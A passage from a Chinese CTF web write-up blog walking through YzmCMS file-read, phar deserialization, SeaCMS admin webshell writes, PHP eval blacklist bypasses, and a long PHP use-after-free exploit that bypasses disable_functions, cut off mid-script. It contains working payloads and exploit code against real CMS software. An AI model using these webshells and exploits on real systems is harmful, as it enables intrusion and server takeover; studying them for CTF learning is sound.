<p>照着这个复现一下就可以打过去：<a href="https://github.com/yzmcms/yzmcms/issues/53">https://github.com/yzmcms/yzmcms/issues/53</a></p>
<p>找到了洞不知道怎么利用，真的是有够菜的，还是来看看原理。</p>
<p>当时最大的问题就是不能回显，当时我直接在网址配置中用file协议读文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228153535.png" alt=""></p>
<p>提交之后，点击测试采集，在phpstorm打断点调试，在运行到100行的时候，content中的内容是/etc/passwd的文件内容。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228153848.png" alt=""></p>
<p>但是在调用get_sub_content函数之后，content的值会被改变，我们跟进这个函数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228154259.png" alt=""></p>
<p>这个函数用了两次explode函数把content分割成一个数组，然后返回一个冒号。既然这样，我们知道flag的格式是<code>flag&#123;&#125;</code>那么把<code>start</code>改成<code>f</code>，把<code>end</code>改成<code>&#125;</code>，再经过这个函数处理后就可以保留关键的地方：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228201139.png" alt=""></p>
<p>但是问题又来了，content的内容还要经过get_all_url函数的处理，继续跟进：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228201349.png" alt=""></p>
<p>第65行preg_match_all函数提取a标签中的内容，并且在下面的foreach循环中，会接着提取href元素内容，既然如此，那么我们就把要读取的文件写在a标签的href元素中作为链接，然后封装在一个HTML文件中。</p>
<p>例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">z<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;file:///Users/ca01h/flag&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span>y</span><br></pre></td></tr></table></figure>
<p>模块采集配置：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204207.png" alt=""></p>
<p>跟进函数</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203235.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203432.png" alt=""></p>
<p>但是在第83行还要经过url_check函数的检查，跟进：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228203622.png" alt=""></p>
<p>这个函数内部规定了只允许HTTP或HTTPS协议，于是我们用file协议会直接报错。但这种检查前四个字符的方式未免有些简单粗暴，可以使用一个PHP特性绕过：</p>
<blockquote>
<p>When PHP encounters an unknown protocol, it will throw a warning and set the protocol to null. When the Protoco is null or file, the local operation will be carried out. By default, the local file operation will be performed if the protocol is not transferred or the protocol does not exist.</p>
</blockquote>
<p>简单来说就是：当PHP遇到一个不存在的协议的时候，会把协议置空，并且当协议为空或者不存在时，会当做文件操作，即file协议。</p>
<p>既然这样，那我们最后的payload就是：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">z<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;httpxxx:///Users/ca01h/flag&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span>y</span><br></pre></td></tr></table></figure>
<p>最后成功返回到content参数中：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204406.png" alt=""></p>
<p>虽然有个warning，但是文件还是读出来了：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228204838.png" alt=""></p>
<h2 id="0x03-hellophp">0x03 hellophp</h2>
<p>这题也挺简单的，时间都花在上面那道题目了，真的是亏死。。</p>
<p>重点审计class.php这个文件，应该可以很明显的发现有反序列化的漏洞：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228205833.png" alt=""></p>
<p>其中tile和comment都是可以控制的，那么利用其中一个变量即可。</p>
<p>接着需要寻找反序列化的触发点，全局搜索没有unserialize函数后，可以很快的发现admin.php有文件上传功能，那么肯定是要上传phar压缩包触发反序列化，再找文件操作的相关函数，在index.php中有file_exist函数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228210143.png" alt=""></p>
<p>把phar压缩包的路径传入img参数即可触发反序列化。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $title;</span><br><span class="line">    <span class="keyword">public</span> $comment;</span><br><span class="line">    <span class="keyword">public</span> $logo_url;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$title, $comment</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;title = $title;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;comment = $comment;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$title = <span class="string">&quot;1&#x27;.eval(\$_POST[a]).&#x27;a&quot;</span>;</span><br><span class="line">$comment = <span class="number">456</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="comment">### POP链构造</span></span><br><span class="line"><span class="comment">//@unlink(&quot;phar1.phar&quot;);//unlink() 函数删除文件。</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$A = <span class="keyword">new</span> Config($title, $comment);</span><br><span class="line">$phar-&gt;setMetadata($A);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<h2 id="0x04-大家一起来审代码">0x04 大家一起来审代码</h2>
<p>看到这种量级的代码，出题人一般都是拿别市面上的CMS，这个时候就可以先找配置文件看看，在data/common.inc.php文件中：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228213535.png" alt=""></p>
<p>有两个信息：第一出题人用的是seacms，第二数据库的用户名和密码是admin,admin，这个也是本网站的后台密码。</p>
<p>既然是seacms，那我们就充分发挥Google的作用：<a href="https://lhlh22.github.io/2020/10/22/Seacms-v10-1-%E5%90%8E%E5%8F%B0getshell/#%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%89%EF%BC%89">https://lhlh22.github.io/2020/10/22/Seacms-v10-1-后台getshell/#后台命令执行（三）</a></p>
<p>这篇文章提到了admin_notify.php文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228214002.png" alt=""></p>
<p>过滤掉了括号和反引号，那么我们就可以直接<code>include &quot;/flag&quot;;</code>即可，payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;adm1n&#x2F;admin_notify.php?action&#x3D;set</span><br><span class="line">POST: notify1&#x3D;&quot;;include &quot;&#x2F;flag&quot;;&#x2F;&#x2F;&amp;notify2&#x3D;2&amp;notify3&#x3D;3</span><br></pre></td></tr></table></figure>
<p>再访问<code>/data/admin/notify.php</code></p>
<p>除此之外，<code>adm1n/admin_ip.php</code>也可以写入webshell：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228215247.png" alt=""></p>
<p>不知道这个preg_match有啥用。。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST: v&#x3D;&quot;;eval($_POST[1]);&#x2F;&#x2F;&amp;ip&#x3D;1.1.1.1</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BMZCTF2020-Web-WriteUp</title>
    <url>/Web_security/ctf_writeup/31.BMZCTF2020-Web-WriteUp/</url>
    <content><![CDATA[<h1 id="BMZCTF2020-Web-WriteUp">BMZCTF2020 Web WriteUp</h1>
<h2 id="0x01-easyeval">0x01 easyeval</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$cmd=$_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">$cmd=htmlspecialchars($cmd);</span><br><span class="line">$black_list=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;link&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;contents&#x27;</span>);</span><br><span class="line">$cmd = str_ireplace($black_list,<span class="string">&quot;BMZCTF&quot;</span>,$cmd);</span><br><span class="line"><span class="keyword">eval</span>($cmd);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>拼接绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;(&#39;s&#39;.&#39;y&#39;.&#39;s&#39;.&#39;t&#39;.&#39;e&#39;.&#39;m&#39;)(&quot;cat &#x2F;flag&quot;);</span><br></pre></td></tr></table></figure>
<p><strong>十六进制绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;hex2bin(&#39;73797374656d&#39;)(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
<p><strong>异或</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">char = string.printable</span><br><span class="line">cmd = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> cmd:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> char:</span><br><span class="line">            <span class="keyword">if</span>(ord(i)^ord(j) == ord(res)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(tmp1,tmp2)</span><br></pre></td></tr></table></figure>
<p><strong>取反</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">$system=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">$command=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~$system).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~$command).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="0x02-easyphp">0x02 easyphp</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$cmd=$_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($cmd) &gt; <span class="number">25</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>($cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看一下phpinfo的内容，PHP版本7.3，禁掉了很多函数。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230185957.png" alt=""></p>
<p>蚁剑的绕过方式都失败了，参考脚本https://xz.aliyun.com/t/8355</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a = str_repeat(<span class="string">&quot;T&quot;</span>, <span class="number">120</span> * <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2s</span>(<span class="params">&amp;$a, $p, $i, $x = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt; $x;$j++) &#123;</span><br><span class="line">        $a[$p + $j] = chr($i &amp; <span class="number">0xff</span>);</span><br><span class="line">        $i &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">s2i</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; strlen($s);$x++) &#123;</span><br><span class="line">        $result &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $result |= ord($s[$x]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $address - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> strlen($s -&gt; current());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPHPChunk</span>(<span class="params">$maps</span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /&#x27;</span>;</span><br><span class="line">    preg_match_all($pattern, $maps, $match);</span><br><span class="line">    <span class="keyword">foreach</span> ($match[<span class="number">1</span>] <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="keyword">list</span>($start, $end) = explode(<span class="string">&quot;-&quot;</span>, $value);</span><br><span class="line">        <span class="keyword">if</span> (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) &gt;= <span class="number">0x200000</span> &amp;&amp; $length &lt;= <span class="number">0x300000</span>) &#123;</span><br><span class="line">            $address = <span class="keyword">array</span>(s2i(hex2bin($start)), s2i(hex2bin($end)), $length);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[+]PHP Chunk: &quot;</span> . $start . <span class="string">&quot; - &quot;</span> . $end . <span class="string">&quot;, length: 0x&quot;</span> . dechex($length) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> $address;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb1</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (leak($a, s2i($_GET[<span class="string">&quot;test1&quot;</span>])) === <span class="number">0x5454545454545454</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (s2i($_GET[<span class="string">&quot;test1&quot;</span>]) &amp; <span class="number">0x7ffff0000000</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Where is here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb2</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    $start = s2i($_GET[<span class="string">&quot;test2&quot;</span>]);</span><br><span class="line">    <span class="keyword">return</span> getElement($a, <span class="keyword">array</span>($start, $start + <span class="number">0x200000</span>, <span class="number">0x200000</span>));</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;[!]Not Found&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElement</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; ($address[<span class="number">2</span>] / <span class="number">0x1000</span> - <span class="number">2</span>);$x++) &#123;</span><br><span class="line">        $addr = <span class="number">0x108</span> + $address[<span class="number">0</span>] + <span class="number">0x1000</span> * $x + <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">for</span> ($y = <span class="number">0</span>;$y &lt; <span class="number">5</span>;$y++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (leak($a, $addr + $y * <span class="number">0x08</span>) === <span class="number">0x1234567812345678</span> &amp;&amp; ((leak($a, $addr + $y * <span class="number">0x08</span> - <span class="number">0x08</span>) &amp; <span class="number">0xffffffff</span>) === <span class="number">0x01</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;[+]SplDoublyLinkedList Element: &quot;</span> . dechex($addr + $y * <span class="number">0x08</span> - <span class="number">0x18</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> $addr + $y * <span class="number">0x08</span> - <span class="number">0x18</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClosureChunk</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $address = leak($a, $address);</span><br><span class="line">    &#125;<span class="keyword">while</span>(leak($a, $address) !== <span class="number">0x00</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Chunk: &quot;</span> . dechex($address) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> $address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSystem</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    $start = $address &amp; <span class="number">0xffffffffffff0000</span>;</span><br><span class="line">    $lowestAddr = ($address &amp; <span class="number">0x0000fffffff00000</span>) - <span class="number">0x0000000001000000</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span> * <span class="number">0x80</span>; $i++) &#123;</span><br><span class="line">        $addr = $start - $i * <span class="number">0x20</span>;</span><br><span class="line">        <span class="keyword">if</span> ($addr &lt; $lowestAddr) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $nameAddr = leak($a, $addr);</span><br><span class="line">        <span class="keyword">if</span> ($nameAddr &gt; $address || $nameAddr &lt; $lowestAddr) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $name = dechex(leak($a, $nameAddr));</span><br><span class="line">        $name = str_pad($name, <span class="number">16</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line">        $name = strrev(hex2bin($name));</span><br><span class="line">        $name = explode(<span class="string">&quot;\x00&quot;</span>, $name)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>($name === <span class="string">&quot;system&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> leak($a, $addr + <span class="number">0x08</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trigger</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $s;</span><br><span class="line">        <span class="keyword">unset</span>($s[<span class="number">0</span>]);</span><br><span class="line">        $a = str_shuffle(str_repeat(<span class="string">&quot;T&quot;</span>, <span class="number">0xf</span>));</span><br><span class="line">        i2s($a, <span class="number">0x00</span>, <span class="number">0x1234567812345678</span>);</span><br><span class="line">        i2s($a, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">7</span>);</span><br><span class="line">        $s -&gt; current();</span><br><span class="line">        $s -&gt; next();</span><br><span class="line">        <span class="keyword">if</span> ($s -&gt; current() !== <span class="number">0x1234567812345678</span>) &#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;[!]UAF Failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $maps = file_get_contents(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!$maps) &#123;</span><br><span class="line">            cantRead($a);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            canRead($maps, $a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[+]Done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass</span>(<span class="params">$elementAddress, &amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    <span class="keyword">if</span> (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get Closure Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $closure_object = leak($a, $closureChunkAddress + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Object: &quot;</span> . dechex($closure_object) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    $closure_handlers = leak($a, $closure_object + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Handler: &quot;</span> . dechex($closure_handlers) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!($system_address = getSystem($a, $closure_handlers))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Couldn&#x27;t determine system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Find system&#x27;s handler: &quot;</span> . dechex($system_address) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x506</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; (<span class="number">0x130</span> / <span class="number">0x08</span>);$i++) &#123;</span><br><span class="line">        $data = leak($a, $closure_object + <span class="number">0x08</span> * $i);</span><br><span class="line">        i2s($a, <span class="number">0x00</span>, $closure_object + <span class="number">0x30</span>);</span><br><span class="line">        i2s($s -&gt; current(), <span class="number">0x08</span> * $i + <span class="number">0x100</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $closure_object + <span class="number">0x30</span>);</span><br><span class="line">    i2s($s -&gt; current(), <span class="number">0x20</span>, $system_address);</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $closure_object);</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x108</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Executing command: \n&quot;</span>;</span><br><span class="line">    ($s -&gt; current())(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">canRead</span>(<span class="params">$maps, &amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    <span class="keyword">if</span> (!$chunkAddress = getPHPChunk($maps)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get PHP Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$elementAddress = getElement($a, $chunkAddress)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bypass($elementAddress, $a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cantRead</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&quot;test1&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_GET[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Please try to get address of PHP Chunk&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;test1&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(dechex(bomb1($a)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        $elementAddress = bomb2($a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$elementAddress) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bypass($elementAddress, $a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> <span class="built_in">SplDoublyLinkedList</span>();</span><br><span class="line">$s -&gt; push(<span class="keyword">new</span> Trigger());</span><br><span class="line">$s -&gt; push(<span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">$s -&gt; push(<span class="function"><span class="keyword">function</span>(<span class="params">$x</span>)</span>&#123;&#125;);</span><br><span class="line"><span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; <span class="number">0x100</span>;$x++) &#123;</span><br><span class="line">    $s -&gt; push(<span 